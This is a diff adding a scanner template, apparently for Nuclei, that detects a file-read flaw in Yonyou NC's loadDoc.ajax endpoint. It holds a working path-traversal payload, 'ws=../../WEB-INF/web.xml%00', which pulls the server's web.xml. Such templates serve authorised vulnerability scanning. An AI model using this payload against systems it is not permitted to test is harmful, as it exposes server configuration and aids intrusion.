@@ -1,0 +1,40 @@
+id: poc-yaml-yonyou-ufida-nc-loaddoc-ajax-anyfile-read
+info:
+  name: Yonyou NC loadDoc.ajax File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ufida"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/uapws/loadDoc.ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "ws=../../WEB-INF/web.xml%00"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</web-app>"
+        part: body
+      - type: regex
+        regex:
+          - "<servlet-name>(.*?)</servlet-name>"
+          - "<filter-class>(.*?)</filter-class>"
+        part: body
